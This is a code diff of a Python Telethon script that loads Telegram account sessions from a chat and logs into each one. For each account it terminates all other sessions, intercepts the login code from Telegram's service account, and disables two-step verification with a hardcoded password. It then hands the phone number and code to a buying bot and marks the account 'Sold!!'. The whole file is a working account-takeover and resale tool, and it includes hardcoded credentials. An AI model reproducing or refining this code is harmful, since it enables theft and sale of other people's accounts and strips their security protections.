@@ -1,6 +1,6 @@
 import time
 import asyncio
-from telethon.sync import TelegramClient, events, functions
+from telethon import TelegramClient, events, functions
 from telethon.sessions import StringSession
 import crypter
 
@@ -12,23 +12,25 @@ pass_2fa = "542543"
 
 TARGET_BOT = '@B172dhhsijsbwusi_bot'
 SOURCE_CHAT = 2576914746
-
 # ==========================================
 
 mClient = TelegramClient('me', api_id, api_hash).start(password=pswd)
 
-
-# ================= KILL OTHER SESSIONS =================
+# ================= SESSION CLEAN =================
 def kill_others(client):
     sessions = client(functions.account.GetAuthorizationsRequest())
 
-    if len(sessions.authorizations) > 1:
-        print("⚠️ Other sessions found, removing...")
-        for s in sessions.authorizations:
-            if s.hash > 0:
+    for s in sessions.authorizations:
+        if not s.current:
+            try:
                 client(functions.account.ResetAuthorizationRequest(hash=s.hash))
-        return False
+            except:
+                pass
     return True
+
+
+# ================= GLOBAL STATE =================
+otp_sent_set = set()   # prevent duplicate OTP send
 
 
 # ================= MAIN =================
@@ -54,93 +56,114 @@ for message in mClient.get_messages(SOURCE_CHAT, None):
         all_ssns.append(ssn)
 
         # ================= LOGIN =================
-        client = TelegramClient(StringSession(ssn), api_id, api_hash).start(password=pass_2fa)
-        cPhn = client.get_me().phone
+        client = TelegramClient(StringSession(ssn), api_id, api_hash)
 
-        print(f"✅ Logged in: {cPhn}")
-
-        if not kill_others(client):
-            print("❌ Skipping (multiple sessions)")
+        try:
+            client.start(password=pass_2fa)
+        except:
+            print("❌ Login failed, skipping")
             continue
 
-        # ================= FLAGS =================
-        otp_sent = False
-        login_detected = False
+        cPhn = client.get_me().phone
+        print(f"✅ Logged in: {cPhn}")
 
-        # ================= BOT START =================
-        mClient.send_message(TARGET_BOT, "📤 ارسال اکانت")
-        print("📤 Order sent")
+        kill_others(client)
 
-        # ================= BOT REPLY HANDLER =================
-        @mClient.on(events.NewMessage(incoming=True, chats=TARGET_BOT))
+        # ================= STATE =================
+        state = {
+            "otp_sent": False,
+            "login_detected": False,
+            "number_requested": False
+        }
+
+        # ================= BOT HANDLER =================
         async def bot_handler(event):
             text = event.raw_text
 
-            # Ask number
-            if "لطفا شماره مجازی خود را" in text:
+            if "لطفا شماره مجازی خود را" in text and not state["number_requested"]:
                 print("📱 Sending number...")
                 await mClient.send_message(TARGET_BOT, '+' + cPhn)
+                state["number_requested"] = True
 
-        # ================= OTP + LOGIN DETECT =================
-        @client.on(events.NewMessage(incoming=True, chats=777000))
+        # ================= OTP HANDLER =================
         async def otp_handler(event):
-            global otp_sent, login_detected
-
             text = event.raw_text
             print("📩 777000:", text)
 
+            # ❌ Don't send OTP if bot didn't ask number
+            if not state["number_requested"]:
+                return
+
             # OTP detect
-            if text.startswith("Login code:"):
+            if text.startswith("Login code:") and not state["otp_sent"]:
+
+                if cPhn in otp_sent_set:
+                    return
+
                 otp = text.replace("Login code: ", "").split('.')[0]
                 print(f"🔑 OTP: {otp}")
 
-                # ====== 🔥 2FA DISABLE BEFORE SENDING OTP ======
+                # ===== 2FA disable =====
                 try:
                     result = await client(functions.account.GetPasswordRequest())
                     if result.has_password:
-                        print("🔐 2FA detected → disabling...")
-                        await client.edit_2fa('542543')
+                        print("🔐 Disabling 2FA...")
+                        await client.edit_2fa(pass_2fa)
                         print("✅ 2FA disabled")
-                    else:
-                        print("❌ No 2FA active")
                 except Exception as e:
                     print(f"❌ 2FA error: {e}")
-                # =============================================
 
-                # OTP send AFTER 2FA off
                 await mClient.send_message(TARGET_BOT, otp)
-                otp_sent = True
 
-            # New login detect
+                state["otp_sent"] = True
+                otp_sent_set.add(cPhn)
+
+            # Login detect
             if (
                 "logged in" in text.lower() or
                 "new login" in text.lower() or
                 "successfully logged in" in text.lower()
             ):
-                print("✅ New login detected")
-                login_detected = True
+                state["login_detected"] = True
 
             # 2FA detect
             if (
                 "two-step verification" in text.lower() or
-                "2-step verification" in text.lower() or
-                "password changed" in text.lower()
+                "2-step verification" in text.lower()
             ):
-                print("🔐 2FA activity detected")
-                login_detected = True
+                state["login_detected"] = True
 
-            # FINAL CONDITION
-            if otp_sent and login_detected:
+            # FINAL EXIT
+            if state["otp_sent"] and state["login_detected"]:
                 print("🚀 Done → Logging out")
 
                 await client.log_out()
                 await client.disconnect()
+
+        # ================= ADD HANDLERS =================
+        bot_event = mClient.add_event_handler(
+            bot_handler,
+            events.NewMessage(incoming=True, chats=TARGET_BOT)
+        )
+
+        otp_event = client.add_event_handler(
+            otp_handler,
+            events.NewMessage(incoming=True, chats=777000)
+        )
+
+        # ================= START BOT =================
+        mClient.send_message(TARGET_BOT, "📤 ارسال اکانت")
+        print("📤 Order sent")
 
         # ================= RUN =================
         try:
             client.run_until_disconnected()
         except:
             pass
+
+        # ================= CLEAN HANDLERS =================
+        mClient.remove_event_handler(bot_handler)
+        client.remove_event_handler(otp_handler)
 
         # ================= MARK SOLD =================
         mClient.send_message(SOURCE_CHAT, 'Sold!!', reply_to=message.id)
